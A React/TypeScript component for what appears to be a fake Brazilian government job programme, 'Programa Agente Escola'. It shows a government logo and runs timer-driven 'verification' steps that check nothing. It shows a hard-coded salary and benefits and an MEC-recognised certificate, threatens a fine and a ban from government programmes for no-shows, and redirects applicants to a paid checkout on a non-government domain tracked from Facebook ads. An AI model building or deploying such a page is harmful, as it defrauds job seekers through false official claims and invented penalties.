import React, { useEffect, useState } from "react";
import { Check, MapPin, DollarSign, GraduationCap, Award } from "lucide-react";
import { useLocation } from "../context/LocationContext";
import useUtmNavigator from "../hooks/useUtmNavigator";
import GovLogo from "../components/GovLogo";
import { usePixelTracking } from '../hooks/usePixelTracking';

const ProgramDetails: React.FC = () => {
	usePixelTracking();
	
	const [selectedLocation, setSelectedLocation] = useState<string>("");
	const [acceptedTerms, setAcceptedTerms] = useState({
		attendance: false,
		information: false,
	});
	const [showSuccess, setShowSuccess] = useState(false);
	const [showSuccessMessage, setShowSuccessMessage] = useState(false);
	const [showSavedPopup, setShowSavedPopup] = useState(false);
	const [showConfirmedPopup, setShowConfirmedPopup] = useState(false);
	const { selectedCEP, nearbySchools } = useLocation();
	const [confirmationSteps, setConfirmationSteps] = useState([
		{
			id: "region",
			status: "loading",
			title: "Confirmação da Região",
			subtitle: "Verificando região...",
			icon: MapPin,
			value: "Vagas disponíveis",
		},
		{
			id: "salary",
			status: "loading",
			title: "Salário Disponível",
			subtitle: "Calculando remuneração mensal...",
			icon: DollarSign,
			value: "R$ 3.456,13 mensais",
		},
		{
			id: "benefits",
			status: "loading",
			title: "Benefícios Adicionais",
			subtitle: "Verificando pacote de benefícios...",
			icon: Award,
			value: "Vale alimentação, plano de saúde e seguro de vida",
		},
		{
			id: "training",
			status: "loading",
			title: "Treinamento Gratuito",
			subtitle: "Consultando programas de treinamento...",
			icon: GraduationCap,
			value: "Capacitação integral e efetiva, com certificado reconhecido nacionalmente",
		},
	]);

	useEffect(() => {
		if (!selectedCEP) {
			const navigate = useUtmNavigator();
			navigate("/inscricao");
			return;
		}

		const completeSteps = async () => {
			setShowSavedPopup(true);
			await new Promise((resolve) => setTimeout(resolve, 3000));
			setShowSavedPopup(false);

			for (let i = 0; i < confirmationSteps.length; i++) {
				await new Promise((resolve) => setTimeout(resolve, 1000));
				setConfirmationSteps((prev) =>
					prev.map((step, index) => ({
						...step,
						status: index <= i ? "completed" : "loading",
					}))
				);
			}

			setShowConfirmedPopup(true);
			await new Promise((resolve) => setTimeout(resolve, 3000));
			setShowConfirmedPopup(false);
			setShowSuccessMessage(true);
		};

		completeSteps();
	}, [selectedCEP]);

	const handleSubmit = () => {
		if (selectedLocation && acceptedTerms.attendance && acceptedTerms.information) {
			setShowSuccess(true);
			setTimeout(() => {
				window.location.href = "https://checkout.inscricao-agentescoladofuturo.online/VCCL1O8SCK8R?utm_source=FB&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}";
			}, 4000);
		}
	};

	const completedSteps = confirmationSteps.filter((step) => step.status === "completed").length;
	const progress = (completedSteps / confirmationSteps.length) * 100;

	const nearestSchools = nearbySchools.slice(0, 3).sort((a, b) => a.distance - b.distance);

	return (
		<main className="container mx-auto px-4 py-4 flex-grow">
			{showSavedPopup && (
				<div className="fixed top-0 left-0 right-0 bg-white shadow-lg z-50 animate-slideDown">
					<div className="max-w-2xl mx-auto p-4">
						<div className="flex items-center gap-4">
							<div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
								<Check className="w-5 h-5 text-green-500" />
							</div>
							<div>
								<h2 className="text-lg font-semibold">Dados salvos com sucesso</h2>
								<p className="text-sm text-gray-600">Seus dados foram salvos. Continue o processo de inscrição.</p>
							</div>
						</div>
					</div>
				</div>
			)}

			{showConfirmedPopup && (
				<div className="fixed top-0 left-0 right-0 bg-green-50 shadow-lg z-50 animate-slideDown">
					<div className="max-w-2xl mx-auto p-4">
						<div className="flex items-center gap-4">
							<div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
								<Check className="w-5 h-5 text-green-500" />
							</div>
							<div>
								<h2 className="text-lg font-semibold text-green-800">Inscrição confirmada com sucesso</h2>
								<p className="text-sm text-green-600">Sua inscrição foi validada. Agora escolha seu local de prova.</p>
							</div>
						</div>
					</div>
				</div>
			)}

			<div className="max-w-2xl mx-auto">
				<div className="mb-6">
					<h1 className="text-[#1351B4] text-2xl font-bold">Programa Agente Escola</h1>
					<div className="h-1 w-48 bg-[#2ECC71] mt-2"></div>
				</div>

				<div className="bg-white rounded-lg p-6 shadow-sm">
					<div className="mb-8">
						<h2 className="text-xl font-bold mb-3">Confirmação da sua Inscrição</h2>
						<p className="text-[#505A5F] text-base">
							Aguarde enquanto verificamos e confirmamos os detalhes da sua inscrição no programa.
						</p>
					</div>

					<div className="h-2 bg-blue-100 rounded-full mb-8">
						<div
							className="h-2 bg-[#1351B4] rounded-full transition-all duration-1000"
							style={{ width: `${progress}%` }}
						></div>
					</div>

					<div className="space-y-8 relative">
						<div className="absolute left-[15px] top-0 bottom-0 w-[2px] bg-gray-200"></div>

						{confirmationSteps.map((step, index) => (
							<div key={step.id} className="flex items-start gap-6 relative">
								<div
									className={`w-8 h-8 rounded-full flex items-center justify-center z-10 transition-colors duration-300 ${
										step.status === "completed"
											? "bg-green-500 text-white"
											: step.status === "loading"
											? "bg-blue-100 text-blue-500"
											: "bg-gray-200"
									}`}
								>
									{step.status === "completed" ? <Check size={16} /> : <step.icon size={16} />}
								</div>
								<div className="flex-1 pt-1">
									<div className="flex items-center gap-2 text-lg font-semibold">
										<span>{step.title}</span>
									</div>
									<p className={`${step.status === "completed" ? "text-green-600" : "text-gray-500"}`}>
										{step.status === "completed" ? step.value : step.subtitle}
									</p>
								</div>
							</div>
						))}
					</div>

					{showSuccessMessage && (
						<div className="mt-8 p-6 bg-green-50 rounded-lg border border-green-100">
							<h3 className="text-green-700 font-bold text-lg mb-2">
								Parabéns! Sua avaliação preliminar foi bem-sucedida.
							</h3>
							<p className="text-gray-700">
								Selecione abaixo um local para realização da sua prova de admissão no programa. Esta é a
								última etapa para concluir sua inscrição.
							</p>
						</div>
					)}

					{confirmationSteps.every((step) => step.status === "completed") && (
						<>
							<div className="mt-8">
								<h2 className="text-[#1351B4] text-xl font-bold mb-4">Informações do Programa</h2>
								<div className="bg-[#EFF6FF] p-6 rounded-lg">
									<h3 className="text-xl font-bold mb-4">Remuneração do Programa</h3>
									
									<div className="text-center mb-6">
										<div className="text-green-600 text-3xl font-bold">R$ 3.456,13</div>
										<div className="text-gray-600 text-sm">Salário mensal do profissional contratado</div>
									</div>

									<div className="space-y-4">
										<div>
											<h4 className="font-semibold mb-1">Curso de capacitação profissional</h4>
											<p className="text-gray-600 text-sm">Programa completo com duração de 1 mês</p>
										</div>

										<div>
											<h4 className="font-semibold mb-1">Material didático gratuito</h4>
											<p className="text-gray-600 text-sm">Acesso a todos os recursos de aprendizagem</p>
										</div>

										<div>
											<h4 className="font-semibold mb-1">Certificado oficial</h4>
											<p className="text-gray-600 text-sm">Reconhecido pelo Ministério da Educação</p>
										</div>
									</div>
								</div>
							</div>

							<div className="bg-white rounded-lg p-6 shadow-sm mb-8">
								<h2 className="text-xl font-bold text-[#1351B4] mb-6">Local de Prova do Processo Seletivo</h2>

								<p className="text-gray-600 mb-6">
  Selecione abaixo o local de prova mais conveniente para você. <br />
 <strong> A prova será realizada no dia 05/02/2026 às 14h</strong>.
</p>

								<div className="space-y-4">
									{nearestSchools.map((school) => (
										<label
											key={school.id}
											className={`block p-4 rounded-lg border-2 cursor-pointer transition-colors ${
												selectedLocation === school.id
													? "border-[#1351B4] bg-blue-50"
													: "border-gray-200 hover:border-gray-300"
											}`}
										>
											<div className="flex items-start gap-3">
												<input
													type="radio"
													name="location"
													value={school.id}
													checked={selectedLocation === school.id}
													onChange={(e) => setSelectedLocation(e.target.value)}
													className="mt-1"
												/>
												<div>
													<div className="font-medium">{school.name}</div>
													<div className="text-gray-500 flex items-center gap-1 mt-1">
														<MapPin size={16} />
														<span>Escola</span>
													</div>
												</div>
											</div>
										</label>
									))}
								</div>
							</div>

							<div className="space-y-4 mb-8">
								<label
									className={`block p-4 rounded-lg transition-all ${
										acceptedTerms.attendance
											? "bg-green-50 border border-green-100"
											: "bg-red-50 border border-red-100"
									}`}
								>
									<div className="flex items-start gap-3">
										<div className="relative flex items-center justify-center">
											<input
												type="checkbox"
												checked={acceptedTerms.attendance}
												onChange={(e) =>
													setAcceptedTerms((prev) => ({
														...prev,
														attendance: e.target.checked,
													}))
												}
												className="appearance-none w-5 h-5 rounded border transition-colors cursor-pointer
													checked:bg-green-500 checked:border-green-500"
											/>
											{acceptedTerms.attendance && (
												<Check size={16} className="absolute text-white pointer-events-none" />
											)}
										</div>
										<div>
											<div className="font-medium text-red-700">Concordo com a política de não comparecimento</div>
											<p className="text-red-600 text-sm mt-1">Caso não compareça à prova, estarei sujeito a <strong>multa de R$ 35,00</strong> e bloqueio temporário de 90 dias para novas inscrições em programas do governo.</p>
										</div>
									</div>
								</label>

								<label
									className={`block p-4 rounded-lg transition-all ${
										acceptedTerms.information
											? "bg-green-50 border border-green-100"
											: "bg-red-50 border border-red-100"
									}`}
								>
									<div className="flex items-start gap-3">
										<div className="relative flex items-center justify-center">
											<input
												type="checkbox"
												checked={acceptedTerms.information}
												onChange={(e) =>
													setAcceptedTerms((prev) => ({
														...prev,
														information: e.target.checked,
													}))
												}
												className="appearance-none w-5 h-5 rounded border transition-colors cursor-pointer
													checked:bg-green-500 checked:border-green-500"
											/>
											{acceptedTerms.information && (
												<Check size={16} className="absolute text-white pointer-events-none" />
											)}
										</div>
										<div>
											<div className="font-medium text-red-700">Declaro que as informações são verdadeiras</div>
											<p className="text-red-600 text-sm mt-1">A falsificação de informações ou documentos resultará em <strong>cancelamento imediato da inscrição</strong> e banimento permanente de todos os processos seletivos do programa.</p>
										</div>
									</div>
								</label>
							</div>

							<button
								onClick={handleSubmit}
								disabled={!selectedLocation || !acceptedTerms.attendance || !acceptedTerms.information}
								className="w-full bg-[#1351B4] text-white py-4 rounded-full flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
							>
								<Check size={20} />
								<span className="font-semibold">Finalizar Inscrição</span>
							</button>
						</>
					)}
				</div>
			</div>

			{showSuccess && (
				<div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
					<div className="bg-white rounded-xl p-8 max-w-md w-full mx-4 shadow-2xl">
						<div className="flex flex-col items-center">
							<GovLogo />
							<h2 className="text-2xl font-bold text-[#1351B4] mt-8 mb-4 whitespace-nowrap">Carregando Ambiente Seguro...</h2>
							<p className="text-gray-600 text-center mb-8">Estamos preparando um ambiente seguro para o processamento do seu pagamento. Por favor, aguarde um momento.</p>
							<div className="w-12 h-12">
								<div className="w-12 h-12 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
							</div>
							<p className="text-xs text-gray-500 text-center mt-8">Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD) e as melhores práticas de segurança.</p>
						</div>
					</div>
				</div>
			)}
		</main>
	);
};

export default ProgramDetails;
